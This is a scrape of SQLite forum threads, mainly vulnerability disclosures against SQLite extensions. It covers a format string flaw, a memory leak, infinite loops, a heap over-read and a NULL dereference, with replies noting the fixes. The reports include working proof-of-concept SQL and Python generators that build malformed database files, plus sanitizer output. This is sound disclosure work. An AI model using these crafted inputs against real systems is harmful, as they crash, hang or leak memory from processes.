SELECT ALL CAST((+ (t0.c0)) AS NUMERIC) FROM v0, t0;

This query returns four rows, two of which are NULL and to of which are 0.  0 is not NULL
and so if one of the 0 rows is returned first, then WHERE clause is false.

Adding extra layers of parentheses does not change any of the above.  Adding NOT INDEXED
does not change any of the above.  When you specify a query or subquery that has multiple
correct answers, the database engine (SQLite or any other flavor of SQL) is free to choose
any of the correct answers.  You may not make any assumptions about which answer
it will choose to return.

title: ALTER TABLE ... ALTER ... DROP NOT NULL only removes one not null constraint

posts.author: mseng (msengb)
posts.body:
Dear sqlite team,

I believe I've discovered a bug in the new ALTER TABLE ... ALTER ... DROP NOT NULL syntax.

When a column is defined with multiple not null constraints, a single DROP NOT NULL only removes one of them rather than making the column nullable. This seems rather unintuitive as a user expects the column to become nullable after DROP NOT NULL. After a second DROP NOT NULL the column becomes nullable.

Tested on https://sqlite.org/fiddle/index.html with sqlite version 3.54.0.

CREATE TABLE foo(bar int CONSTRAINT "null1" NOT NULL CONSTRAINT "null2" NOT NULL);
pragma table_info(foo); -- not nullable
ALTER TABLE foo ALTER bar DROP NOT NULL;
pragma table_info(foo); -- not nullable, even though nullability was expected
ALTER TABLE foo ALTER bar DROP NOT NULL;
pragma table_info(foo); -- nullable

Currently the documentation doesn't state this fact. If this turns out to be expected behaviour please add this to the docs.
PS: I know that having two not null constraints is kinda unecessary.

Thank you!

posts.author: drh
posts.body:
Documentation updated at check-in eb89f278c85570e0 to explain
that ALTER TABLE ALTER COLUMN DROP NOT NULL will remove at least one NOT NULL constraint from
a column, but not necessarily all of them.  No changes to code.

title: Vuln17: Format String Vulnerability in analyze() Extension via Attacker-Controlled Table Names

posts.author: dan
posts.body:
Thanks for this. Now fixed here:

https://sqlite.org/src/info/c6d5793d5d

Dan.

posts.author: ylwang (yuelinwang)
posts.body:
The vulnerability is found by yiwei dai(代艺炜 in Chinese, a clarify for "原创性证明").

Summary
In ext/misc/analyze.c at line 333, analysisSubreport() forwards a caller-built title string straight into analysisTitle() as the format argument:
if( rc==SQLITE_ROW ){
analysisTitle(p, zTitle);   /* line 333  zTitle is the format string */

analysisTitle() at line 193 then passes that string unchanged to sqlite3_vmprintf():
static void analysisTitle(Analysis *p, const char *zFormat, ...){
...
va_start(ap, zFormat);
zTitle = sqlite3_vmprintf(zFormat, ap);   /* line 199 */

The caller of analysisSubreport composes zTitle from the upper-cased table name at line 684:
char *zTitle = sqlite3_mprintf("Table %s", zUpper);   /* zUpper = upper(tblname) */
rc = analysisSubreport(&s, zTitle, zWhere, pgsz, nPage);

A table name containing %q therefore becomes %Q after upper() and reaches sqlite3_vmprintf as a live format specifier with no matching variadic argument. SQLite's %Q handler reads the next va_list slot as a char* and dereferences it. Because the actual call supplied zero variadic args, that slot holds whatever uninitialized value happens to live there, and a load through it crashes when the value is not a valid pointer. Other uppercase specifiers behave similarly. %X prints the slot as a hex integer and leaks adjacent stack or register contents, while %J and %E also dereference pointer slots.

The analyze() SQL function is built into the SQLite CLI shell through shell.c which includes ext/misc/analyze.c and registers analyzeFunc with SQLITE_INNOCUOUS. Any party who can issue CREATE TABLE with a controlled name, or who can hand the victim a .db file whose schema carries such a name, can trigger the bug.

PoC
Three SQL inputs were tested against the ASAN-built ./sqlite3. All three reach analyzeFunc -> analysisSubreport -> analysisTitle -> sqlite3_vmprintf along the same path.

Approach A info leak via %X (vuln_001.sql):
CREATE TABLE "t_%x_%x_%x_%x" (a INTEGER PRIMARY KEY, b TEXT);
INSERT INTO "t_%x_%x_%x_%x" VALUES(1, 'test data for analyze');
SELECT analyze('main');

The analyze report body prints a heading where the four %X tokens have been replaced by hex words pulled from uninitialized stack and register slots, for example Table T_4548_0_1_7FFF8328.

Approach C crash via 16 %Q specifiers (vuln_001_crash2.sql):
CREATE TABLE "t_%q_%q_%q_%q_%q_%q_%q_%q_%q_%q_%q_%q_%q_%q_%q_%q" (a INTEGER PRIMARY KEY, b TEXT);
INSERT INTO "t_%q_%q_%q_%q_%q_%q_%q_%q_%q_%q_%q_%q_%q_%q_%q_%q" VALUES(1, 'test');
SELECT analyze('main');

Run:
./sqlite3 < vuln_001_crash2.sql

ASAN output (vuln_001_crash2_result.txt):
AddressSanitizer:DEADLYSIGNAL
==3989428==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000001 (pc 0x55555652026e bp 0x7fffffffabe0 sp 0x7fffffffa900 T0)
==3989428==The signal is caused by a READ memory access.
==3989428==Hint: address points to the zero page.
#0 0x55555652026e in sqlite3_str_vappendf /data/ylwang/LargeScan/targets/sqlite/sqlite3.c:33383
#1 0x555556527961 in sqlite3_vmprintf /data/ylwang/LargeScan/targets/sqlite/sqlite3.c:33901
#2 0x55555643985f in analysisTitle /data/ylwang/LargeScan/targets/sqlite/shell.c:19682
#3 0x55555643a567 in analysisSubreport /data/ylwang/LargeScan/targets/sqlite/shell.c:19816
#4 0x55555643ca7e in analyzeFunc /data/ylwang/LargeScan/targets/sqlite/shell.c:20169
#5 0x5555567b0bf1 in sqlite3VdbeExec /data/ylwang/LargeScan/targets/sqlite/sqlite3.c:104412
#6 0x55555671c183 in sqlite3Step /data/ylwang/LargeScan/targets/sqlite/sqlite3.c:93422
#7 0x55555671d4d3 in sqlite3_step /data/ylwang/LargeScan/targets/sqlite/sqlite3.c:93483
#8 0x5555563a76e5 in sqlite3_format_query_result /data/ylwang/LargeScan/targets/sqlite/shell.c:3901
SUMMARY: AddressSanitizer: SEGV /data/ylwang/LargeScan/targets/sqlite/sqlite3.c:33383 in sqlite3_str_vappendf
==3989428==ABORTING

The %Q handler at sqlite3_str_vappendf consumed an empty va_list, treated 0x1 as a char*, and faulted on the load. The frames analysisTitle at shell.c:19682 and analysisSubreport at shell.c:19816 correspond to ext/misc/analyze.c:199 and ext/misc/analyze.c:333 after amalgamation.

Fix
Change the call at ext/misc/analyze.c:333 from analysisTitle(p, zTitle) to analysisTitle(p, "%s", zTitle) so the attacker-controlled string is treated as data rather than format. The other analysisTitle call sites already pass a literal format and are unaffected.

title: Vuln18: ICU Extension icu_load_collation Direct-Leaks UCollator on Invalid Strength Argument

posts.author: dan
posts.body: Thanks. Now fixed here: https://sqlite.org/src/info/87c37dab7e

posts.author: ylwang (yuelinwang)
posts.body:
The vulnerability is found by yiwei dai(代艺炜 in Chinese, a clarify for "原创性证明").

Summary
ASAN reports this as a Direct leak of an attacker-reachable allocation, not a one-time init artifact. Each errored call to icu_load_collation(locale, name, strength) with an unrecognized strength argument permanently loses one UCollator object.

In ext/icu/icu.c, icuLoadCollation() opens a UCollator at line 483 before validating the strength option:
pUCollator = ucol_open(zLocale, &status);   /* line 483 */
if( !U_SUCCESS(status) ){
icuFunctionError(p, "ucol_open", status);
return;
}

When the third argument is supplied, the strength string is matched against a fixed table. If no entry matches, the error path at lines 509 to 519 returns straight to SQLite without freeing pUCollator:
if( i>=sizeof(aStrength)/sizeof(aStrength[0]) ){
sqlite3_str *pStr = sqlite3_str_new(sqlite3_context_db_handle(p));
sqlite3_str_appendf(pStr,
"unknown collation strength \"%s\" - should be one of:", zOption);
for(i=0; i<sizeof(aStrength)/sizeof(aStrength[0]); i++){
sqlite3_str_appendf(pStr, " %s", aStrength[i].zName);
}
sqlite3_result_error(p, sqlite3_str_value(pStr), -1);
sqlite3_free(sqlite3_str_finish(pStr));
return;   /* line 519  pUCollator never reaches ucol_close */
}

The asymmetry is visible a few lines below at line 526, where the failure path of sqlite3_create_collation_v2 correctly calls ucol_close(pUCollator). The strength validation path forgot to do the same.

Every errored call leaks exactly one direct allocation of 272 bytes plus a chain of indirect ICU allocations rooted at it. An attacker who can issue arbitrary SQL drives RSS upward at roughly 272 bytes per call with no upper bound and no way for the application to free the leaked collators.

PoC
Build the ICU shim once against the ASAN sqlite3 binary:

-I/data/ylwang/LargeScan/targets/sqlite \
$(pkg-config --cflags icu-uc icu-i18n) \

-o /data/ylwang/LargeScan/targets/sqlite/audit-results/poc/ext_icu_icu/libsqliteicu.so \
$(pkg-config --libs icu-uc icu-i18n)

SELECT icu_load_collation('en_US', 'leak_test', 'INVALID_STRENGTH');

Run:

ASAN output (the relevant Direct-leak entry, the new allocation produced by the call):
Error near line 14: unknown collation strength "INVALID_STRENGTH" - should be one of: PRIMARY SECONDARY TERTIARY DEFAULT QUARTERNARY IDENTICAL

=================================================================
==3815230==ERROR: LeakSanitizer: detected memory leaks

Direct leak of 272 byte(s) in 1 object(s) allocated from:
#0 0x7ffff766e887 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:145
#1 0x7ffff30f92ec  (libicui18n ucol_open internals)
#2 0x7ffff32e3971
#3 0x7ffff32e3b8f
#4 0x7ffff3426304
#5 0x7ffff389e582
#6 0x5555567b0bf1 in sqlite3VdbeExec /data/ylwang/LargeScan/targets/sqlite/sqlite3.c:104412
#7 0x55555671c183 in sqlite3Step /data/ylwang/LargeScan/targets/sqlite/sqlite3.c:93422
#8 0x55555671d4d3 in sqlite3_step /data/ylwang/LargeScan/targets/sqlite/sqlite3.c:93483
...

Add ucol_close(pUCollator); immediately before the return at ext/icu/icu.c:519. The change mirrors the existing cleanup at line 526 for the sqlite3_create_collation_v2 failure path.

title: Vuln19: Unbounded B-tree Traversal in btreeinfo binfoCompute Hangs on Cyclic Child Pointers

posts.author: drh
posts.body: Fixed by check-in 646e9b49153ebd7e.

posts.author: ylwang (yuelinwang)
posts.body:
The vulnerability is found by yiwei dai(代艺炜 in Chinese, a clarify for "原创性证明").

Summary
In ext/misc/btreeinfo.c, the function binfoCompute() walks from a B-tree root page down to a leaf by repeatedly reading the next child page number from raw page bytes. The walk lives inside a while(1) at line 287 with no maximum depth and no visited-page set:
static int binfoCompute(sqlite3 *db, int pgno, BinfoCursor *pCsr){
...
pCsr->depth = 1;
while(1){                                              /* line 287 */
sqlite3_bind_int(pStmt, 1, pgno);
rc = sqlite3_step(pStmt);
...
pCsr->hasRowid = aData[0]!=2 && aData[0]!=10;
nCell = get_uint16(aData+3);
nEntry *= (nCell+1);
if( aData[0]==10 || aData[0]==13 ) break;            /* line 307 leaf-only exit */
nPage *= (nCell+1);
...
if( nCell<=1 ){
pgno = get_uint32(aData+8);                        /* line 314 right-child pointer */
}else{
iCell = get_uint16(aData+12+2*(nCell/2));
...
pgno = get_uint32(aData+iCell);
}
pCsr->depth++;
sqlite3_reset(pStmt);
}

The only loop exit is line 307, which fires only when the current page header byte is 0x0A (leaf index) or 0x0D (leaf table). If a malicious database file uses interior page types (0x05 table interior, 0x02 index interior) for every page in a cycle, the leaf condition never holds, the loop runs forever, and any SELECT from sqlite_btreeinfo that touches that root pegs one CPU.

The bug is reachable from any party who can hand the victim a .db file and induce a SELECT from sqlite_btreeinfo. The btreeinfo extension is shipped in the SQLite source tree under ext/misc/ and is commonly loaded by analysis tools and database inspectors.

A secondary problem is signed integer overflow on nEntry and nPage, which are multiplied by (nCell+1) every iteration. With no upper bound on iteration count both wrap quickly under UBSan, but the practical impact is dominated by the hang.

PoC
Build the extension once with the same ASAN toolchain as the target ./sqlite3:
gcc -fPIC -shared -fsanitize=address -O0 -g3 \
-I /data/ylwang/LargeScan/targets/sqlite \
/data/ylwang/LargeScan/targets/sqlite/ext/misc/btreeinfo.c \
-o /data/ylwang/LargeScan/targets/sqlite/audit-results/poc/ext_misc_btreeinfo/btreeinfo.so

vuln_001_gen.py writes a four-page SQLite database (vuln_001_cyclic.db):

page
role

1
valid sqlite_schema declaring table t1 rooted at page 2

2
interior table page (0x05), 1 cell pointing to page 4, right-child pointer to page 3

3
interior table page (0x05), 1 cell pointing to page 4, right-child pointer back to page 2

4
empty leaf, never reached

When binfoCompute(db, 2, ...) runs, the walk is page 2 -> page 3 -> page 2 -> page 3 -> ... and never hits the leaf-only break at line 307.

Generator (vuln_001_gen.py):
#!/usr/bin/env python3
"""
Build a 4-page SQLite database whose interior B-tree pages form a 2<->3 cycle.
binfoCompute() in ext/misc/btreeinfo.c follows the right-child pointer at
offset 8 whenever nCell<=1, so it loops 2 -> 3 -> 2 -> 3 -> ... forever.
"""
import struct, os

PAGE_SIZE = 4096
NUM_PAGES = 4

def make_header():
h = bytearray(100)
h[0:16] = b"SQLite format 3\x00"
struct.pack_into(">H", h, 16, PAGE_SIZE)
h[18] = 1; h[19] = 1
h[21] = 64; h[22] = 32; h[23] = 32
struct.pack_into(">I", h, 24, 1)              # file change counter
struct.pack_into(">I", h, 28, NUM_PAGES)      # db size in pages
struct.pack_into(">I", h, 40, 1)              # schema cookie
struct.pack_into(">I", h, 44, 4)              # schema format
struct.pack_into(">I", h, 56, 1)              # UTF-8
struct.pack_into(">I", h, 92, 1)
struct.pack_into(">I", h, 96, 3054000)
return h

def make_varint(v):
if v <= 127: return bytes([v])
if v <= 16383: return bytes([0x80 | (v >> 7), v & 0x7F])
parts = []
while v > 0x7F:
parts.append(v & 0x7F); v >>= 7
parts.append(v); parts.reverse()
return bytes([(0x80 | p) if i < len(parts)-1 else p for i, p in enumerate(parts)])

def make_sqlite_schema_record(table_name, rootpage, sql):
type_val = b"table"; name_val = table_name.encode()
tbl_val = table_name.encode(); sql_val = sql.encode()
hdr = (make_varint(len(type_val)*2+13) + make_varint(len(name_val)*2+13) +
make_varint(len(tbl_val)*2+13) + make_varint(1) + make_varint(len(sql_val)*2+13))
hdr_size = len(hdr) + len(make_varint(len(hdr)+1))
return make_varint(hdr_size) + hdr + type_val + name_val + tbl_val + struct.pack("B", rootpage) + sql_val

def make_page1():
page = bytearray(PAGE_SIZE)
page[0:100] = make_header()
bth = 100
page[bth] = 0x0D                                    # leaf table b-tree
struct.pack_into(">H", page, bth+3, 1)              # nCell
record = make_sqlite_schema_record("t1", 2, "CREATE TABLE t1(x)")
cell = make_varint(len(record)) + make_varint(1) + record
off = PAGE_SIZE - len(cell)
page[off:off+len(cell)] = cell
struct.pack_into(">H", page, bth+5, off)
struct.pack_into(">H", page, bth+8, off)
return bytes(page)

def make_interior_page(right_child_pgno, cell_child_pgno):
page = bytearray(PAGE_SIZE)
page[0] = 0x05                                      # interior table b-tree
struct.pack_into(">H", page, 3, 1)                  # nCell = 1
struct.pack_into(">I", page, 8, right_child_pgno)   # right-child pointer
cell = struct.pack(">I", cell_child_pgno) + make_varint(1)
off = PAGE_SIZE - len(cell)
page[off:off+len(cell)] = cell
struct.pack_into(">H", page, 5, off)
struct.pack_into(">H", page, 12, off)
return bytes(page)

def make_leaf_page():
page = bytearray(PAGE_SIZE)
page[0] = 0x0D
struct.pack_into(">H", page, 5, PAGE_SIZE)
return bytes(page)

def main():
outpath = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_001_cyclic.db")
with open(outpath, "wb") as f:
f.write(make_page1())
f.write(make_interior_page(right_child_pgno=3, cell_child_pgno=4))  # page 2 -> 3
f.write(make_interior_page(right_child_pgno=2, cell_child_pgno=4))  # page 3 -> 2
f.write(make_leaf_page())
print(f"Wrote {outpath}")

if __name__ == "__main__":
main()

Run:
cd /data/ylwang/LargeScan/targets/sqlite/audit-results/poc/ext_misc_btreeinfo
timeout 25 /data/ylwang/LargeScan/targets/sqlite/sqlite3 vuln_001_cyclic.db \
".load ./btreeinfo.so sqlite3_btreeinfo_init" \
"SELECT * FROM sqlite_btreeinfo;"

Observed output:
table|sqlite_schema|sqlite_schema|1||1|2|1|1|
(no further rows, query never returns)

sqlite3 exit code: 124
TIMEOUT: The query hung (infinite loop in binfoCompute confirmed)

Exit code 124 from timeout indicates the query was killed after the wall-clock budget elapsed. The first row for sqlite_schema is emitted because its root page is a leaf, then the cursor advances to table t1 (root page 2) and binfoCompute enters the cyclic walk and never returns.

Fix
Bound the traversal by either tracking the set of visited page numbers and bailing on revisit, or by capping pCsr->depth at a small constant such as 32, which already exceeds the maximum legal B-tree depth for SQLite's page-size limits. On either signal, return SQLITE_CORRUPT the same way the in-loop sanity checks at lines 309 and 318 already do.

title: Vuln20-1: Heap Buffer Over-Read in scrub scrubBackupVarint on Interior B-tree Cell

posts.author: ylwang (yuelinwang)
posts.body:
Summary
In ext/misc/scrub.c the scrubBackupBtree() function processes the cells of an interior b-tree page. At line 434 the cell pointer pc is bounded only by pc > p->szUsable-3, and for interior pages (type 0x02 or 0x05) line 436 allows pc up to szUsable-4. After the 4-byte child pointer is read and pc += 4 runs at line 438, pc equals szUsable. With reserved bytes set to 0 the usable size equals the page size, so the scrubBackupVarint(&a[pc], &P) call at line 442 starts reading at a[szPage], which is the first byte past the heap page buffer allocated by scrubBackupAllocPage() at line 95. Because scrubBackupVarint() follows the high continuation bit, trailing 0x80 bytes let the decoder walk up to 9 bytes past the buffer end.

This code is reached only through the sqlite3_scrub_backup() C API in ext/misc/scrub.c. That API is not part of the sqlite3 CLI, so verification uses the standalone utility that the same file builds under -DSCRUB_STANDALONE.

PoC
Build the standalone scrub utility against the amalgamation under AddressSanitizer. The -DSQLITE_MAX_MMAP_SIZE=0 flag forces the source page into a heap buffer so ASan can attribute the over-read to that allocation rather than failing an internal check on a memory-mapped address:
gcc -g -O0 -fsanitize=address -DSCRUB_STANDALONE -DSQLITE_MAX_MMAP_SIZE=0 \
-I/data/ylwang/LargeScan/targets/sqlite \
/data/ylwang/LargeScan/targets/sqlite/ext/misc/scrub.c \
/data/ylwang/LargeScan/targets/sqlite/sqlite3.c \
-o sqlite3scrub_asan -lpthread -ldl -lm

Python generator (vuln_001_gen.py) builds a 2-page database where page 1 is a valid schema pointing table t1 at page 2, and page 2 is an interior index page (0x02) whose single cell pointer is szUsable-4 so that after the 4-byte child pointer is read pc reaches szUsable:
import struct, os

PAGE_SIZE = 4096
NUM_PAGES = 2
SZ_USABLE = PAGE_SIZE

def be16(v): return struct.pack('>H', v & 0xFFFF)
def be32(v): return struct.pack('>I', v & 0xFFFFFFFF)

def varint(val):
if val <= 0x7f: return bytes([val])
if val <= 0x3fff: return bytes([0x80|((val>>7)&0x7f), val&0x7f])
if val <= 0x1fffff: return bytes([0x80|((val>>14)&0x7f), 0x80|((val>>7)&0x7f), val&0x7f])
if val <= 0x0fffffff: return bytes([0x80|((val>>21)&0x7f), 0x80|((val>>14)&0x7f), 0x80|((val>>7)&0x7f), val&0x7f])
return bytes([0x80|((val>>(7*(7-i)))&0x7f) for i in range(8)] + [val&0xff])

def page1():
p = bytearray(PAGE_SIZE)
p[0:16] = b'SQLite format 3\x00'
p[16:18] = be16(PAGE_SIZE); p[18]=1; p[19]=1; p[20]=0
p[21]=64; p[22]=32; p[23]=32
p[24:28]=be32(1); p[28:32]=be32(NUM_PAGES)
p[40:44]=be32(1); p[44:48]=be32(4); p[56:60]=be32(1)
p[92:96]=be32(1); p[96:100]=be32(3054000)
p[100]=0x0d; p[103:105]=be16(1); cc=200
p[105:107]=be16(cc); p[108:110]=be16(cc)
serials = varint(2*5+13)+varint(2*2+13)+varint(2*2+13)+varint(2)+varint(2*18+13)
record = varint(1+len(serials)) + serials + b'table'+b't1'+b't1'+be16(2)+b'CREATE TABLE t1(x)'
cell = varint(len(record)) + varint(1) + record
p[cc:cc+len(cell)] = cell
return bytes(p)

def page2():
p = bytearray(PAGE_SIZE)
p[0]=0x02; p[3:5]=be16(1); pc=SZ_USABLE-4   # cell pointer = szUsable-4
p[5:7]=be16(pc); p[8:12]=be32(0); p[12:14]=be16(pc)
for i in range(4088, PAGE_SIZE): p[i]=0xFF   # continuation bits run the varint off the page
p[pc:pc+4]=be32(0)                           # 4-byte child ptr; after pc+=4, pc == szUsable
return bytes(p)

out = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'vuln_001.db')
open(out, 'wb').write(page1() + page2())
print("wrote", out)

Run:
python3 vuln_001_gen.py
rm -f out1.db    # destination must not already exist
ASAN_OPTIONS=detect_leaks=0 ./sqlite3scrub_asan vuln_001.db out1.db

Trigger output:
yuelinwang@XXF-GPU-03:.../ext_misc_scrub$ ASAN_OPTIONS=detect_leaks=0 ./sqlite3scrub_asan vuln_001.db out1.db
=================================================================
==2326506==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x521000004d08 at pc 0x555555580177 bp 0x7fffffffdf10 sp 0x7fffffffdf00
READ of size 1 at 0x521000004d08 thread T0
#0 0x555555580176 in scrubBackupVarint /data/ylwang/LargeScan/targets/sqlite/ext/misc/scrub.c:282
#1 0x555555580d8a in scrubBackupBtree /data/ylwang/LargeScan/targets/sqlite/ext/misc/scrub.c:442
#2 0x55555558190b in sqlite3_scrub_backup /data/ylwang/LargeScan/targets/sqlite/ext/misc/scrub.c:542
#3 0x555555581f3e in main /data/ylwang/LargeScan/targets/sqlite/ext/misc/scrub.c:598

0x521000004d08 is located 0 bytes to the right of 4104-byte region [0x521000003d00,0x521000004d08)
allocated by thread T0 here:
#5 0x55555557ed23 in scrubBackupAllocPage /data/ylwang/LargeScan/targets/sqlite/ext/misc/scrub.c:95
#6 0x55555557edec in scrubBackupRead /data/ylwang/LargeScan/targets/sqlite/ext/misc/scrub.c:109
#7 0x555555580790 in scrubBackupBtree /data/ylwang/LargeScan/targets/sqlite/ext/misc/scrub.c:395

SUMMARY: AddressSanitizer: heap-buffer-overflow /data/ylwang/LargeScan/targets/sqlite/ext/misc/scrub.c:282 in scrubBackupVarint

Impact
An application that runs sqlite3_scrub_backup() on an attacker-supplied database file suffers a heap buffer over-read of up to 9 bytes, which can crash the process or leak adjacent heap contents into the decoded varint.

Fix
After the pc += 4 at line 438, reject the cell when pc >= p->szUsable before calling scrubBackupVarint, mirroring the existing pc >= p->szUsable guard already present at line 443.

title: Vuln21-2: Infinite Loop in scrub scrubBackupFreelist on Cyclic Freelist Trunk Chain

posts.author: ylwang (yuelinwang)
posts.body:
Summary
In ext/misc/scrub.c the scrubBackupFreelist() function walks the freelist trunk chain with the loop while( pgno && nFree ) at line 313. Each iteration reads the trunk page, writes it to the destination, and sets pgno = scrubBackupInt32(a) from the page's first four bytes at line 322. The code that would decrement nFree lives inside an #if 0 block at lines 323 to 338, so nFree never changes. There is also no visited-page tracking. A trunk page whose next-trunk pointer refers back to itself makes pgno stay non-zero forever and the loop never terminates.

Like Vuln20, the vulnerable path is reached only through sqlite3_scrub_backup(), so it is exercised with the standalone -DSCRUB_STANDALONE build.

PoC
Use the same sqlite3scrub_asan binary built in Vuln20.

Python generator (vuln_002_gen.py) writes a 2-page database whose header marks one freelist page starting at page 2, where page 2 is a trunk page whose next-trunk pointer is page 2 itself:
import struct, os

PAGE_SIZE = 4096
NUM_PAGES = 2

def page1():
p = bytearray(PAGE_SIZE)
p[0:16] = b"SQLite format 3\x00"
struct.pack_into(">H", p, 16, PAGE_SIZE)
p[18]=1; p[19]=1; p[20]=0; p[21]=64; p[22]=32; p[23]=32
struct.pack_into(">I", p, 24, 1)
struct.pack_into(">I", p, 28, NUM_PAGES)
struct.pack_into(">I", p, 32, 2)   # first freelist trunk page -> page 2
struct.pack_into(">I", p, 36, 1)   # freelist page count (non-zero, never decremented)
struct.pack_into(">I", p, 44, 4)
struct.pack_into(">I", p, 56, 1)
struct.pack_into(">I", p, 92, 1)
struct.pack_into(">I", p, 96, 3054000)
p[100] = 0x0d                       # empty sqlite_schema leaf
return bytes(p)

def page2():
p = bytearray(PAGE_SIZE)
struct.pack_into(">I", p, 0, 2)     # next trunk -> page 2 (self-cycle)
struct.pack_into(">I", p, 4, 0)     # 0 leaf entries
return bytes(p)

out = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_002.db")
open(out, "wb").write(page1() + page2())
print("wrote", out)

Run:
python3 vuln_002_gen.py
rm -f out2.db    # destination must not already exist
ASAN_OPTIONS=detect_leaks=0 timeout 6 ./sqlite3scrub_asan vuln_002.db out2.db
echo "exit=$?"

Trigger output:
yuelinwang@XXF-GPU-03:.../ext_misc_scrub$ ASAN_OPTIONS=detect_leaks=0 timeout 6 ./sqlite3scrub_asan vuln_002.db out2.db
exit=124

Exit code 124 from timeout confirms the process never returns. A backtrace taken while the process spins shows it pinned inside the freelist loop:
#0  __libc_pwrite64
#5  scrubBackupWrite (p=..., pgno=2, ...) at ext/misc/scrub.c:129
#6  scrubBackupFreelist (p=..., pgno=2, nFree=1) at ext/misc/scrub.c:321
#7  sqlite3_scrub_backup (zSrcFile="vuln_002.db", zDestFile="out2.db", ...) at ext/misc/scrub.c:529
#8  main (argc=3, argv=...) at ext/misc/scrub.c:598

The walk reads and rewrites page 2 endlessly because pgno stays 2 and nFree stays 1.

Impact
An application that runs sqlite3_scrub_backup() on an attacker-supplied database file hangs with one CPU core at full load and continuous disk writes, giving a denial of service with no way for the caller to recover.

Fix
Track visited trunk page numbers and bail out on a revisit, or bound the loop by the database page count, returning an error like the other corruption checks in the file already do.

title: Vuln22-3: NULL Pointer Dereference in diskused .diskused on Autoindex Record With NULL tbl_name

posts.author: ylwang (yuelinwang)
posts.body:
Summary
In ext/misc/diskused.c the .diskused report builds an allobj CTE that reads tbl_name straight from sqlite_schema near line 513, then runs SELECT upper(tblname) ... GROUP BY 1 near line 637 and passes each result row to diskusedLine() through (const char*)sqlite3_column_text(pStmt,0) at line 646. When a sqlite_schema record carries a NULL tbl_name, upper(NULL) is SQL NULL and sqlite3_column_text() returns a C NULL pointer. That NULL becomes the zDesc argument of diskusedLine(), where the strlen(zDesc) call at line 246 dereferences it and the process crashes.

An autoindex record reaches this state because its sql column is NULL, so sqlite3InitCallback() in src/prepare.c loads it through the branch that only reads argv[1] (name) and argv[3] (rootpage) and never inspects argv[2] (tbl_name). The crafted NULL tbl_name therefore survives schema loading and is only dereferenced later by .diskused. The diskused extension is compiled into the CLI shell by default in recent builds, so the bug is reachable from the sqlite3 binary directly.

PoC
The database is produced by creating a normal table with a text primary key, which yields an autoindex record whose sql is NULL, then binary-patching that record so its tbl_name serial type becomes 0 (NULL).

Python generator (vuln_001_gen.py) creates the table, locates the autoindex record (type='index', sql=NULL) in page 1, rewrites its cell so column 2 (tbl_name) has serial type 0, and fixes the cell pointer and content-area offset:
import sqlite3, os

DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_001.db")

def read_varint(d, off):
r = 0
for i in range(9):
b = d[off+i]
if i < 8:
r = (r << 7) | (b & 0x7F)
if b < 0x80: return r, i+1
else: return (r << 8) | b, 9

def enc_varint(v):
if v <= 0x7F: return bytes([v])
if v <= 0x3FFF: return bytes([0x80|(v>>7), v&0x7F])
parts, t = [], v
for _ in range(8):
parts.append(t & 0x7F); t >>= 7
if t == 0: break
parts.reverse()
for j in range(len(parts)-1): parts[j] |= 0x80
return bytes(parts)

def serial_len(st):
if st < 10: return [0,1,2,3,4,6,8,8,0,0][st]
return (st-12)//2 if st % 2 == 0 else (st-13)//2

# Create a TEXT primary key table -> autoindex record with sql=NULL
if os.path.exists(DB_PATH): os.remove(DB_PATH)
c = sqlite3.connect(DB_PATH)
c.execute("CREATE TABLE t1(x TEXT PRIMARY KEY, y TEXT)")
c.execute("INSERT INTO t1 VALUES('hello','world')")
c.commit(); c.close()

data = bytearray(open(DB_PATH, "rb").read())
ncells = int.from_bytes(data[103:105], "big")
CP = 108                                   # cell pointer array on page 1

for i in range(ncells):
po = CP + i*2
co = int.from_bytes(data[po:po+2], "big")
pos = co
plen, v1 = read_varint(data, pos); pos += v1
rowid, v2 = read_varint(data, pos); pos += v2
pstart = pos
hlen, hv = read_varint(data, pos); pos += hv
sts, hend = [], pstart + hlen
while pos < hend:
st, sv = read_varint(data, pos); pos += sv; sts.append(st)
offs, dp = [], hend
for st in sts:
offs.append((dp, serial_len(st))); dp += serial_len(st)
t = sts[0]
if not (t >= 13 and t % 2 == 1): continue
if data[offs[0][0]:offs[0][0]+(t-13)//2].decode() != "index" or sts[4] != 0: continue

sts[2] = 0                             # tbl_name -> NULL
hs = b"".join(enc_varint(s) for s in sts)
body = b"".join(bytes(data[o:o+l]) for k,(o,l) in enumerate(offs) if k != 2)
new_payload = enc_varint(1+len(hs)) + hs + body
new_cell = enc_varint(len(new_payload)) + enc_varint(rowid) + new_payload

old_total = v1 + v2 + plen
new_co = co + (old_total - len(new_cell))
for b in range(co, co+old_total): data[b] = 0
data[new_co:new_co+len(new_cell)] = new_cell
data[po] = (new_co >> 8) & 0xFF; data[po+1] = new_co & 0xFF
mn = min(int.from_bytes(data[CP+j*2:CP+j*2+2], "big") for j in range(ncells))
data[105] = (mn >> 8) & 0xFF; data[106] = mn & 0xFF   # content-area start
break

open(DB_PATH, "wb").write(data)
print("wrote", DB_PATH)

Run:
python3 vuln_001_gen.py
echo ".diskused" | /data/ylwang/LargeScan/targets/sqlite/sqlite3 vuln_001.db

Trigger output:
yuelinwang@XXF-GPU-03:.../ext_misc_diskused$ echo ".diskused" | /data/ylwang/LargeScan/targets/sqlite/sqlite3 vuln_001.db
shell.c:19729:11: runtime error: null pointer passed as argument 1, which is declared to never be null

The amalgamated shell.c:19729 corresponds to the strlen(zDesc) call in diskusedLine() at ext/misc/diskused.c:246. The schema still loads cleanly because the autoindex loading path never reads argv[2], so the NULL tbl_name is undetected until .diskused consumes it.

Impact
An attacker who can hand the victim a database file and have .diskused (or SELECT diskused(...)) run against it crashes the sqlite3 process for a denial of service.

Fix
Guard the sqlite3_column_text(pStmt,0) results at the two diskusedLine() call sites near lines 646 and 662, substituting a placeholder such as "(unknown)" or skipping the row when the column is NULL.

title: Vuln24-5: Unsigned Integer Overflow in printf %#Q and %#q Quote Sizing Causes Heap Buffer Overflow

posts.author: drh
posts.body: Fixed by check-in 2026-05-31T09:18:31.445Z.

posts.author: ylwang (yuelinwang)
posts.body:
Summary
